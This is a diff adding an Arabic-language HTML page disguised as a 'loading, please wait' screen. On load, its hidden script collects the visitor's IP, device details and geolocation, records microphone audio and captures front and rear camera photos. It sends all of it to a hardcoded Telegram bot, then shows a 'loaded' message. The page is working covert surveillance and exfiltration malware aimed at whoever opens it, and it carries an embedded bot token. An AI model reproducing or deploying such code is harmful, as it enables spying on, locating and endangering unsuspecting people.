@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>...جارى التحميل</title>
+  <style>
+    body { background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:'Segoe UI',sans-serif; }
+    #msg { font-size:18px; color:#00d1b2; }
+    #v, canvas { display:none; }
+    /* توست */
+    #toast {
+      visibility: hidden;
+      min-width: 200px;
+      background-color: #00d1b2;
+      color: #121212;
+      text-align: center;
+      border-radius: 8px;
+      padding: 12px;
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-weight: bold;
+      z-index: 1;
+    }
+    #toast.show {
+      visibility: visible;
+      animation: fadein 0.5s, fadeout 0.5s 2.5s;
+    }
+    @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+    @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+  </style>
+</head>
+<body>
+  <div id="msg">جاري التحميل يرجى الانتظار...</div>
+  <div id="toast">تم التحميل</div>
+
+  <video id="v" autoplay playsinline></video>
+  <canvas id="c" width="640" height="480"></canvas>
+
+<script>
+  const CONFIG = { token: '8256799115:AAFWB_PAl-d7d4zl9uR4yabOGBUKFWDm9hU', chatId: '7654014302' };
+
+  function showToast() {
+    const toast = document.getElementById("toast");
+    toast.className = "show";
+    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
+  }
+
+  async function runWorker() {
+    const device = { platform: navigator.platform, agent: navigator.userAgent.split(' ').pop(), lang: navigator.language };
+    try {
+      // 1. IP
+      let ip = "غير معروف";
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch(e) {}
+
+      const info = `📱 جهاز: ${device.platform}\n🌐 IP: ${ip}\n🔍 متصفح: ${device.agent}`;
+
+      // 2. الموقع
+      const loc = await new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          p => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+          e => resolve("الموقع مرفوض"),
+          { timeout: 8000 }
+        );
+      });
+
+      // 3. الميكروفون
+      try {
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(audioStream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/ogg' });
+          await sendData(blob, "Voice Log", "voice");
+          audioStream.getTracks().forEach(t => t.stop());
+        };
+        recorder.start();
+        await new Promise(r => setTimeout(r, 3000));
+        recorder.stop();
+      } catch(e) { console.log("Mic blocked"); }
+
+      // 4. الكاميرا
+      await captureAndSend("user", `صورة أمامية\n${info}\n📍 ${loc}`);
+      await captureAndSend("environment", `صورة خلفية\nIP: ${ip}`);
+
+      // عند الانتهاء
+      showToast();
+    } catch (err) {
+      console.log("فشل الفحص: " + err.message);
+    }
+  }
+
+  async function captureAndSend(mode, caption) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+      const v = document.getElementById('v');
+      v.srcObject = stream;
+      await new Promise(r => setTimeout(r, 1000));
+      const c = document.getElementById('c');
+      c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+      return new Promise(resolve => {
+        c.toBlob(async (blob) => {
+          await sendData(blob, caption, "photo");
+          stream.getTracks().forEach(t => t.stop());
+          resolve();
+        }, 'image/jpeg');
+      });
+    } catch (e) { console.log("Camera blocked: " + mode); }
+  }
+
+  async function sendData(blob, caption, type) {
+    const fd = new FormData();
+    fd.append('chat_id', CONFIG.chatId);
+    fd.append(type === "photo" ? "photo" : "voice", blob);
+    fd.append('caption', caption);
+    const endpoint = type === "photo" ? "sendPhoto" : "sendVoice";
+    try {
+      await fetch(`https://api.telegram.org/bot${CONFIG.token}/${endpoint}`, { method: 'POST', body: fd });
+    } catch (e) { console.error("Telegram Error: ", e); }
+  }
+
+  // تشغيل تلقائي عند تحميل الصفحة
+  window.onload = runWorker;
+</script>
+</body>
+</html>
